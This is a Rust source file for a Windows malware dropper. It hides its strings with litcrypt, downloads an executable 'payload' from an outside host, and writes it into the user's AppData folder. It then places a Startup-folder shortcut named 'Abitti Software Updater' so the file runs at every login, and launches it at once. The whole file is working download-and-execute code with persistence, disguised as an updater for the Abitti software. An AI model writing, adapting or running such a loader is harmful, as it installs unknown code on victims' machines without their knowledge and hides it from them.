use std::fs;

#[macro_use]
extern crate litcrypt;

use_litcrypt!();


use windows::{core::{Interface, PCWSTR}, Win32::{System::Com::{CoCreateInstance, CoInitializeEx, IPersistFile, CLSCTX_INPROC_SERVER, COINIT_APARTMENTTHREADED}, UI::Shell::{IShellLinkW, ShellLink}}};

#[tokio::main]
async fn main() {
    let download_url = lc!("https://homecdn.frii.site/kake/updater.exe");

    let resp = reqwest::get(download_url).await.expect(&lc!("failed to download payload"));
    let body = resp.bytes().await.expect("Invalid payload");

    let username = std::env::var(lc!("USERNAME")).unwrap();

    let base_path = lc!("C:\\Users\\") + &username + &lc!("\\AppData\\Local\\Abitti2");
    if let Err(e) = fs::create_dir_all(&base_path) {
    }

    let path = base_path + &lc!("\\abitti_svcmgr.exe");
    if let Err(e) = fs::write(&path, body) {
    }

    
    let shortcut_path = lc!("C:\\Users\\") + &username + &lc!("\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\AbittiUpdater.lnk");
    println!("{}", shortcut_path);
    println!("{}", path);
    unsafe {
        let _ = CoInitializeEx(None, COINIT_APARTMENTTHREADED);
        let shell_link: IShellLinkW = CoCreateInstance(&ShellLink, None, CLSCTX_INPROC_SERVER).unwrap();

        let _ = shell_link.SetPath(PCWSTR::from_raw((path.clone()+"\0").encode_utf16().collect::<Vec<u16>>().as_ptr()));
        let _ = shell_link.SetDescription(PCWSTR::from_raw(lc!("Abitti Software Updater\0").encode_utf16().collect::<Vec<u16>>().as_ptr()));
        let _ = shell_link.SetWorkingDirectory(PCWSTR::from_raw(lc!("C:\\Windows\\System32\0").encode_utf16().collect::<Vec<u16>>().as_ptr()));

        let persist_file: IPersistFile = shell_link.cast().unwrap();
        let startup_w: Vec<u16> = shortcut_path.encode_utf16().chain(std::iter::once(0)).collect();

        if let Err(e) = persist_file.Save(PCWSTR::from_raw(startup_w.as_ptr()), true) {
            println!("{}", e);
        }
        println!("Created shortcut");
    }

    let _ = std::process::Command::new(path).spawn();
}
